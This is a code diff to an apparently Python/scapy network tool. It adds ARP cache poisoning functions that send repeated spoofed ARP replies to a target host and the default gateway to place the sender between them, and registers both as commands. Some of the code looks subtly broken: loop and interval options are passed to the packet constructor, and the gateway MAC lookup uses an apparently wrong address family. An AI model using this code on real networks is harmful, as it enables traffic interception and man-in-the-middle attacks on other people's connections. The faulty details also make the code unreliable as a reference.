@@ -16,12 +16,32 @@ def ping(ip, mac):
 def arpcachepoison(ip, mac):
     # found details on the 'op' param found at:
     # http://stackoverflow.com/questions/32804176/python-scapy-arp-request-and-response
-    arp_packet = ARP(op=ARP.is_at, hwsrc=local_mac, psrc=local_ip, hwdst=ip)
-    response = sr(arp_packet)
-    print(response)
-    # send(arp_packet)
+
+    # arp_request = ARP(op=ARP.who_has, psrc=local_ip, pdst=ip) # request ip to local_ip
+    # response = sr(arp_request)
+
+    gateways = ni.gateways()
+    gateway_ip = gateways['default'][2][0]
+    gateway_mac = gateways['default'][30][0]
+
+    target = ARP(op=ARP.is_at, psrc=gateway_ip, pdst=ip, hwdst=gateway_mac, inter=RandNum(2, 5), loop=15)
+
+    gateway = ARP(op=ARP.is_at, psrc=ip, pdst=gateway_ip, hwdst=gateway_mac, inter=RandNum(2, 5), loop=15)
+
+    send(target)
+    send(gateway)
+
+def poison_gateway(ip, mac):
+    gateways = ni.gateways()
+    gateway_ip = gateways['default'][2][0]
+    gateway_mac = gateways['default'][30][0]
+
+    # as seen at http://phaethon.github.io/scapy/api/usage.html?highlight=sniff#arp-cache-poisoning
+    sendp( Ether(dst=mac)/ARP(op=ARP.is_at, psrc=gateway_ip, pdst=ip),
+      inter=RandNum(1, 5), loop=15 )
 
 registered = {
     'ping': ping,
-    'arpcachepoison': arpcachepoison
+    'arpcachepoison': arpcachepoison,
+    'poison_gateway': poison_gateway
 }
